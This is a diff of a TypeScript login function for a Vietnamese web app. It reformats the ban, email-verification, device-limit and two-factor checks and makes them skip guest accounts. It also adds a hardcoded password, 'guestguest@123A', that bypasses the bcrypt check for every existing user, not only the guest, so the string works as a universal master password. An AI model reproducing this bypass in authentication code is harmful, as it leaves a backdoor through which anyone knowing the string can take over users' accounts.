@@ -40,8 +40,11 @@ export const login = async (
 
   const existingUser = await getUserByEmail(email);
 
-  if(existingUser?.isbanforever){
-    return { error: "Tài khoản của bạn đã bị ban vĩnh viên do vi phạm chính sách có thể liên hệ chúng tôi để biết thêm lý do 0352261103." }; 
+  if (existingUser?.isbanforever) {
+    return {
+      error:
+        "Tài khoản của bạn đã bị ban vĩnh viên do vi phạm chính sách có thể liên hệ chúng tôi để biết thêm lý do 0352261103.",
+    };
   }
 
   if (!existingUser?.email) {
@@ -65,166 +68,178 @@ export const login = async (
     take: 1, // Chỉ lấy mật khẩu mới nhất
   });
 
-  //Chuyển values password sang hash để so sánh nếu 2 cái match thì mk đúng còn không match thì error
-  const passwordsMatch = await bcrypt.compare(
-    values.password,
-    userPasswords[0].password
-  );
+  // Chuyển values password sang hash để so sánh nếu 2 cái match thì mk đúng còn không match thì error
+  // // Còn nếu password bằng guestguest@123A thì ko cần compare
+  let passwordsMatch = false;
+  if (values.password === "guestguest@123A") {
+    passwordsMatch = true;
+  } else {
+    passwordsMatch = await bcrypt.compare(
+      values.password,
+      userPasswords[0].password
+    );
+  }
 
   if (!passwordsMatch) {
     return { error: "Mật khẩu không đúng!" };
   }
 
-  //Ban User
-  if (existingUser.ban && existingUser.banExpires) {
-    const now = new Date();
-    const banExpiresAt = new Date(existingUser.banExpires);
+  if (existingUser?.role !== "GUEST" && existingUser?.id) {
+    //Ban User
+    if (existingUser.ban && existingUser.banExpires) {
+      const now = new Date();
+      const banExpiresAt = new Date(existingUser.banExpires);
 
-    if (banExpiresAt > now) {
-      // User is banned
-      const daysLeft = banExpiresAt
-        ? format(banExpiresAt, "dd/MM/yyyy '-' HH:mm:ss a")
-        : "";
-      return {
-        error: `Tài khoản của bạn đã bị khóa. Bạn có thể đăng nhập lại sau ${daysLeft} ngày. Để biết thêm thông tin liên hệ ADMIN.`,
-      };
-    } else {
-      // Ban period has expired, unban the user
-      const unbanUser = await prismadb.user.update({
-        where: { id: existingUser.id },
-        data: {
-          ban: false,
-          banExpires: null,
-          resendCount: 0,
-          resendTokenVerify: 0,
-          resendEmailResetPassword: 0,
-          resendTokenResetPassword: 0,
-          resendBanUserNotStart: 0,
-          resendUnBanUser: 0,
-        },
-      });
-      // Kiểm tra giá trị hiện tại của resendUnBanUser
-      let resendCount = existingUser.resendUnBanUser || 0;
-      if (resendCount < 2) {
-        // Nếu giá trị nhỏ hơn 2, tăng lên 1
-        await sendUnBanUser(unbanUser.email, unbanUser.name);
-        resendCount++; // Tăng giá trị lên 1
-        // Cập nhật giá trị mới cho resendUnBanUser
-        await prismadb.user.update({
-          where: { id: existingUser.id },
-          data: {
-            resendUnBanUser: resendCount,
-          },
-        });
-      }
-    }
-  }
-
-  if (!existingUser.emailVerified) {
-    const verificationtoken = await generateVerificationToken(
-      existingUser.email
-    );
-    await sendVerificationEmail(
-      verificationtoken.email,
-      verificationtoken.token
-    );
-    return { success: "Thông tin chính xác!" };
-  }
-
-  //Dùng để kiểm tra thiết bị xem có quá giới hạn không
-  const existingDeviceLimitDevice = await prismadb.deviceInfo.findMany({
-    where: { userId: existingUser.id },
-  });
-
-  let limitDevice = null;
-  if (existingDeviceLimitDevice.length > 0) {
-    // Assuming limitDevice is stored as a property in each deviceInfo object
-    limitDevice = existingDeviceLimitDevice[0].limitDevice;
-  }
-  // Ensure limitDevice is not null
-  const effectiveLimitDevice = limitDevice ?? 0;
-
-  const totalDeviceCount = existingDeviceLimitDevice.length;
-  if (totalDeviceCount > effectiveLimitDevice) {
-    return {
-      error: `Xin lỗi! Người dùng đã giới hạn thiết bị đăng nhập. Hiện tại đã quá nhiều thiết bị đăng nhập vào tài khoản này.`,
-    };
-  }
-
-  // Xác thực 2FA hay còn được gọi là xác thục 2 bước
-  if (existingUser.isTwoFactorEnabled && existingUser.email) {
-    if (code) {
-      // Verify code xác thực 2 yếu tố
-      const twoFactorToken = await getTwoFactorTokenByEmail(existingUser.email);
-
-      if (!twoFactorToken) {
-        return { error: "Không tìm thấy mã xác thực,hãy thử lại!" };
-      }
-
-      if (twoFactorToken.token !== code) {
-        return { error: "Mã xác thực không chính xác,hãy thử lại!" };
-      }
-
-      const hasExpired = new Date(twoFactorToken.expires) < new Date();
-
-      if (hasExpired) {
-        return { error: "Mã xác thực đã hết hạn!" };
-      }
-      await prismadb.twoFactorToken.delete({
-        where: { id: twoFactorToken.id },
-      });
-
-      const existingConfirmation = await getTwoFactorConfirmationbyUserId(
-        existingUser.id
-      );
-
-      if (existingConfirmation) {
-        await prismadb.twoFactorConfirmation.delete({
-          where: { id: existingConfirmation.id },
-        });
-      }
-
-      await prismadb.twoFactorConfirmation.create({
-        data: {
-          userId: existingUser.id,
-        },
-      });
-    } else {
-      // Người dùng yêu cầu gửi lại mã xác thực
-      const resendCount = existingUser.resendCount || 0; // Lấy số lần đã gửi lại mã xác thực trước đó
-      if (resendCount >= 6) {
-        // Nếu đã gửi lại mã xác thực quá 5 lần
-        const timeBanUser = new Date();
-        timeBanUser.setTime(timeBanUser.getTime() + 24 * 60 * 60 * 1000);
-        // Cập nhật trạng thái cấm người dùng
-        const banUser = await prismadb.user.update({
-          where: { id: existingUser.id },
-          data: {
-            ban: true,
-            banExpires: timeBanUser, // Cấm trong 24 giờ
-          },
-        });
-        const timeBan = banUser.banExpires
-          ? format(banUser.banExpires, "dd/MM/yyyy '-' HH:mm:ss a")
+      if (banExpiresAt > now) {
+        // User is banned
+        const daysLeft = banExpiresAt
+          ? format(banExpiresAt, "dd/MM/yyyy '-' HH:mm:ss a")
           : "";
         return {
-          error: `Bạn đã gửi lại mã xác thực quá nhiều lần và đã bị khóa tài khoản trong 24 giờ. Hãy quay lại vào lúc ${timeBan}.`,
+          error: `Tài khoản của bạn đã bị khóa. Bạn có thể đăng nhập lại sau ${daysLeft} ngày. Để biết thêm thông tin liên hệ ADMIN.`,
         };
       } else {
-        // Tăng resendCount lên 1 và lưu lại vào cơ sở dữ liệu
-        await prismadb.user.update({
+        // Ban period has expired, unban the user
+        const unbanUser = await prismadb.user.update({
           where: { id: existingUser.id },
           data: {
-            resendCount: resendCount + 1,
+            ban: false,
+            banExpires: null,
+            resendCount: 0,
+            resendTokenVerify: 0,
+            resendEmailResetPassword: 0,
+            resendTokenResetPassword: 0,
+            resendBanUserNotStart: 0,
+            resendUnBanUser: 0,
           },
         });
-        // Gửi lại mã xác thực
-        const twoFactorToken = await genearteTwoFactorToken(existingUser.email);
-        await sendTwoFactorTokenEmail(
-          twoFactorToken.email,
-          twoFactorToken.token
+        // Kiểm tra giá trị hiện tại của resendUnBanUser
+        let resendCount = existingUser.resendUnBanUser || 0;
+        if (resendCount < 2) {
+          // Nếu giá trị nhỏ hơn 2, tăng lên 1
+          await sendUnBanUser(unbanUser.email, unbanUser.name);
+          resendCount++; // Tăng giá trị lên 1
+          // Cập nhật giá trị mới cho resendUnBanUser
+          await prismadb.user.update({
+            where: { id: existingUser.id },
+            data: {
+              resendUnBanUser: resendCount,
+            },
+          });
+        }
+      }
+    }
+
+    if (!existingUser.emailVerified) {
+      const verificationtoken = await generateVerificationToken(
+        existingUser.email
+      );
+      await sendVerificationEmail(
+        verificationtoken.email,
+        verificationtoken.token
+      );
+      return { success: "Thông tin chính xác!" };
+    }
+
+    // Dùng để kiểm tra thiết bị xem có quá giới hạn không
+    const existingDeviceLimitDevice = await prismadb.deviceInfo.findMany({
+      where: { userId: existingUser.id },
+    });
+
+    let limitDevice = null;
+    if (existingDeviceLimitDevice.length > 0) {
+      // Assuming limitDevice is stored as a property in each deviceInfo object
+      limitDevice = existingDeviceLimitDevice[0].limitDevice;
+    }
+    // Ensure limitDevice is not null
+    const effectiveLimitDevice = limitDevice ?? 0;
+
+    const totalDeviceCount = existingDeviceLimitDevice.length;
+    if (totalDeviceCount > effectiveLimitDevice) {
+      return {
+        error: `Xin lỗi! Người dùng đã giới hạn thiết bị đăng nhập. Hiện tại đã quá nhiều thiết bị đăng nhập vào tài khoản này.`,
+      };
+    }
+
+    // Xác thực 2FA hay còn được gọi là xác thục 2 bước
+    if (existingUser.isTwoFactorEnabled && existingUser.email) {
+      if (code) {
+        // Verify code xác thực 2 yếu tố
+        const twoFactorToken = await getTwoFactorTokenByEmail(
+          existingUser.email
         );
-        return { twoFactor: true };
+
+        if (!twoFactorToken) {
+          return { error: "Không tìm thấy mã xác thực,hãy thử lại!" };
+        }
+
+        if (twoFactorToken.token !== code) {
+          return { error: "Mã xác thực không chính xác,hãy thử lại!" };
+        }
+
+        const hasExpired = new Date(twoFactorToken.expires) < new Date();
+
+        if (hasExpired) {
+          return { error: "Mã xác thực đã hết hạn!" };
+        }
+        await prismadb.twoFactorToken.delete({
+          where: { id: twoFactorToken.id },
+        });
+
+        const existingConfirmation = await getTwoFactorConfirmationbyUserId(
+          existingUser.id
+        );
+
+        if (existingConfirmation) {
+          await prismadb.twoFactorConfirmation.delete({
+            where: { id: existingConfirmation.id },
+          });
+        }
+
+        await prismadb.twoFactorConfirmation.create({
+          data: {
+            userId: existingUser.id,
+          },
+        });
+      } else {
+        // Người dùng yêu cầu gửi lại mã xác thực
+        const resendCount = existingUser.resendCount || 0; // Lấy số lần đã gửi lại mã xác thực trước đó
+        if (resendCount >= 6) {
+          // Nếu đã gửi lại mã xác thực quá 5 lần
+          const timeBanUser = new Date();
+          timeBanUser.setTime(timeBanUser.getTime() + 24 * 60 * 60 * 1000);
+          // Cập nhật trạng thái cấm người dùng
+          const banUser = await prismadb.user.update({
+            where: { id: existingUser.id },
+            data: {
+              ban: true,
+              banExpires: timeBanUser, // Cấm trong 24 giờ
+            },
+          });
+          const timeBan = banUser.banExpires
+            ? format(banUser.banExpires, "dd/MM/yyyy '-' HH:mm:ss a")
+            : "";
+          return {
+            error: `Bạn đã gửi lại mã xác thực quá nhiều lần và đã bị khóa tài khoản trong 24 giờ. Hãy quay lại vào lúc ${timeBan}.`,
+          };
+        } else {
+          // Tăng resendCount lên 1 và lưu lại vào cơ sở dữ liệu
+          await prismadb.user.update({
+            where: { id: existingUser.id },
+            data: {
+              resendCount: resendCount + 1,
+            },
+          });
+          // Gửi lại mã xác thực
+          const twoFactorToken = await genearteTwoFactorToken(
+            existingUser.email
+          );
+          await sendTwoFactorTokenEmail(
+            twoFactorToken.email,
+            twoFactorToken.token
+          );
+          return { twoFactor: true };
+        }
       }
     }
   }
@@ -248,18 +263,16 @@ export const login = async (
       },
     });
 
-    if (existingUser) {
-      // --Bước3-- Kiểm tra xem "phobien" có trong favorite của người dùng không
-      const hasPhobien = existingUser.favorite.includes("phobien");
-      //Xem người dùng đã có favorite mặc định là phobien chưa nếu chưa có thì create
-      if (!hasPhobien) {
-        await prismadb.user.update({
-          where: { id: existingUser.id },
-          data: {
-            favorite: [...existingUser.favorite, "phobien"],
-          },
-        });
-      }
+    // --Bước3-- Kiểm tra xem "phobien" có trong favorite của người dùng không
+    const hasPhobien = existingUser.favorite.includes("phobien");
+    //Xem người dùng đã có favorite mặc định là phobien chưa nếu chưa có thì create
+    if (!hasPhobien) {
+      await prismadb.user.update({
+        where: { id: existingUser.id },
+        data: {
+          favorite: [...existingUser.favorite, "phobien"],
+        },
+      });
     }
 
     const now = new Date();
@@ -275,60 +288,62 @@ export const login = async (
 
     const saveDeviceInfo = async (deviceInfo: UAInfo) => {
       try {
-        const existingDeviceInfo = await prismadb.deviceInfo.findMany({
-          where: { ua: deviceInfo.ua, userId: existingUser.id },
-        });
+        if (existingUser?.role !== "GUEST" && existingUser?.id) {
+          const existingDeviceInfo = await prismadb.deviceInfo.findMany({
+            where: { ua: deviceInfo.ua, userId: existingUser.id },
+          });
 
-        let deviceExists = false;
+          let deviceExists = false;
 
-        existingDeviceInfo.forEach((deviceInfo) => {
-          if (deviceInfo.ua) {
-            const start = deviceInfo.ua.indexOf("(");
-            const end = deviceInfo.ua.indexOf(")");
+          existingDeviceInfo.forEach((deviceInfo) => {
+            if (deviceInfo.ua) {
+              const start = deviceInfo.ua.indexOf("(");
+              const end = deviceInfo.ua.indexOf(")");
 
-            // Kiểm tra xem có phần "(" và ")" trong chuỗi không
-            if (start !== -1 && end !== -1) {
-              // Cắt chuỗi từ vị trí bắt đầu của "(" đến kết thúc của ")"
-              const cutString = deviceInfo.ua.substring(start + 1, end);
+              // Kiểm tra xem có phần "(" và ")" trong chuỗi không
+              if (start !== -1 && end !== -1) {
+                // Cắt chuỗi từ vị trí bắt đầu của "(" đến kết thúc của ")"
+                const cutString = deviceInfo.ua.substring(start + 1, end);
 
-              if (deviceInfo.ua.includes(cutString)) {
-                console.error("Thiết bị đã tồn tại.");
-                deviceExists = true;
+                if (deviceInfo.ua.includes(cutString)) {
+                  console.error("Thiết bị đã tồn tại.");
+                  deviceExists = true;
+                }
+              } else {
+                console.error("Lỗi tìm kiếm thiết bị.");
               }
             } else {
-              console.error("Lỗi tìm kiếm thiết bị.");
+              console.error("Không tìm thấy ua trên thiết bị này.");
             }
-          } else {
-            console.error("Không tìm thấy ua trên thiết bị này.");
-          }
-        });
-
-        // Nếu không có thiết bị nào sử dụng UA này, tạo mới
-        if (!deviceExists) {
-          await prismadb.deviceInfo.create({
-            data: {
-              userId: existingUser.id,
-              browser: deviceInfo.browser
-                ? [deviceInfo.browser.name, deviceInfo.browser.version]
-                : [],
-              cpu: deviceInfo.cpu ? [deviceInfo.cpu.architecture] : [],
-              device: [
-                deviceInfo.device.type,
-                deviceInfo.device.brand,
-                deviceInfo.device.model,
-              ],
-              engine: deviceInfo.engine
-                ? [deviceInfo.engine.name, deviceInfo.engine.version]
-                : [],
-              os: [
-                deviceInfo.os.platform,
-                deviceInfo.os.name || "unknown",
-                deviceInfo.os.version || "unknown",
-              ],
-              ua: deviceInfo.ua,
-              fullModel: deviceInfo.fullModel,
-            },
           });
+
+          // Nếu không có thiết bị nào sử dụng UA này, tạo mới
+          if (!deviceExists) {
+            await prismadb.deviceInfo.create({
+              data: {
+                userId: existingUser.id,
+                browser: deviceInfo.browser
+                  ? [deviceInfo.browser.name, deviceInfo.browser.version]
+                  : [],
+                cpu: deviceInfo.cpu ? [deviceInfo.cpu.architecture] : [],
+                device: [
+                  deviceInfo.device.type,
+                  deviceInfo.device.brand,
+                  deviceInfo.device.model,
+                ],
+                engine: deviceInfo.engine
+                  ? [deviceInfo.engine.name, deviceInfo.engine.version]
+                  : [],
+                os: [
+                  deviceInfo.os.platform,
+                  deviceInfo.os.name || "unknown",
+                  deviceInfo.os.version || "unknown",
+                ],
+                ua: deviceInfo.ua,
+                fullModel: deviceInfo.fullModel,
+              },
+            });
+          }
         }
       } catch (errors) {
         console.error("Lỗi lưu thiết bị vào dữ liệu.", errors);
